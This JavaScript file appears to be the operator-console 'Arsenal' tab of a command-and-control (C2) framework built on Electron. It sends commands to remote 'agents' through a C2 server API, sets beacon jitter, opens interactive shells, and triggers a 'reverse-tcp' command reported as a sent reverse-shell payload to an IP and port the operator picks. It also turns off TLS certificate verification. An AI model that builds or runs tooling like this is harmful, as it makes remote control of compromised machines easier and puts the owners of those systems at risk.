// Arsenal Tab Logic

const arsenalState = {
    selectedAgentId: null
};

function initArsenal() {
    console.log('[Arsenal] Initializing...');

    // Attempt to sync selected agent from main state if possible
    // For now, we rely on the user selecting an agent in the Arsenal UI if we add a selector there
    // Or we use the global 'selectedAgentId' from renderer.js if accessible
}

// Function called by the HTML button
async function configureJitter() {
    console.log('[Arsenal] Configure Jitter clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent in the Agents/Terminal tab first!');
        return;
    }

    // Capture the target Agent ID for the save function
    window.jittertargetAgentId = agentId;

    // Show the modal
    document.getElementById('jitterModal').style.display = 'flex';
}

function closeJitterModal() {
    document.getElementById('jitterModal').style.display = 'none';
}

async function saveJitterConfig() {
    const jitterVal = parseFloat(document.getElementById('jitterInput').value);
    const agentId = window.jittertargetAgentId;

    if (isNaN(jitterVal) || jitterVal < 0 || jitterVal > 1.0) {
        showNotification('Error', 'Invalid Jitter value! Must be between 0.0 and 1.0');
        return;
    }

    closeJitterModal();
    console.log(`[Arsenal] Setting Jitter to ${jitterVal} for Agent ${agentId}`);

    try {
        await sendCommandToAgent(agentId, `set-jitter ${jitterVal}`);
        showNotification('Success', `Jitter update queued for ${agentId}`);
    } catch (error) {
        console.error('[Arsenal] Failed to set jitter:', error);
        showNotification('Error', `Failed to set jitter: ${error.message}`);
    }
}

// Function to launch interactive shell from Arsenal tab
function launchInteractiveShell() {
    console.log('[Arsenal] Launching Interactive Shell');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    // switchView is defined in renderer.js but accessible globally? 
    // Usually functions in renderer.js are not global unless explicitly attached to window.
    // We might need to trigger the tab click.
    const terminalTab = document.querySelector('.nav-item[data-view="terminal"]');
    if (terminalTab) terminalTab.click();

    // Trigger the burst mode toggle if it's off
    // Polling to ensure view is rendered and button exists
    let attempts = 0;
    const interval = setInterval(() => {
        const toggleBurstBtn = document.getElementById('toggleBurstMode');
        attempts++;

        console.log(`[Arsenal] Checking for Toggle Button (Attempt ${attempts})... Found:`, !!toggleBurstBtn);

        if (toggleBurstBtn) {
            clearInterval(interval);
            if (!toggleBurstBtn.classList.contains('active')) {
                console.log('[Arsenal] Auto-clicking Interactive Mode ON');
                toggleBurstBtn.click();
            } else {
                console.log('[Arsenal] Interactive Mode already ON');
            }
        }

        if (attempts > 10) {
            console.error('[Arsenal] Failed to find toggle button after view switch');
            clearInterval(interval);
        }
    }, 100);
}

// Helper to reuse the send command logic from renderer.js
// We might need to export sendCommand from renderer.js or duplicate small logic
async function sendCommandToAgent(agentId, cmd) {
    const { ipcRenderer } = require('electron');
    // Using axios directly as in renderer.js
    const axios = require('axios');
    const https = require('https');
    const httpsAgent = new https.Agent({ rejectUnauthorized: false });

    // Use correct endpoint: /api/agents/<agent_id>/command
    await axios.post(`${c2ServerURL}/api/agents/${agentId}/command`, {
        command: cmd
    }, {
        headers: { 'Authorization': `Bearer ${authToken}` },
        httpsAgent: httpsAgent
    });
}

// ==========================================
// Reverse TCP Logic
// ==========================================

function configureReverseTCP() {
    console.log('[Arsenal] Configure Reverse TCP clicked');
    const agentId = window.selectedAgentId || selectedAgentId;

    if (!agentId) {
        showNotification('Error', 'Please select an agent first!');
        return;
    }

    window.reverseTcpTargetId = agentId;
    document.getElementById('reverseTCPModal').style.display = 'flex';
}

function closeReverseTCPModal() {
    document.getElementById('reverseTCPModal').style.display = 'none';
}

async function startReverseTCP() {
    const ip = document.getElementById('tcpIpInput').value;
    const port = document.getElementById('tcpPortInput').value;
    const agentId = window.reverseTcpTargetId;

    if (!ip || !port) {
        showNotification('Error', 'Please provide both IP and Port');
        return;
    }

    closeReverseTCPModal();
    console.log(`[Arsenal] Starting Reverse TCP to ${ip}:${port} for Agent ${agentId}`);

    try {
        const cmd = `reverse-tcp ${ip} ${port}`;
        await sendCommandToAgent(agentId, cmd);
        showNotification('Success', `Reverse Shell Payload Sent!`);
    } catch (error) {
        console.error('[Arsenal] Failed to send reverse tcp:', error);
        showNotification('Error', `Failed: ${error.message}`);
    }
}
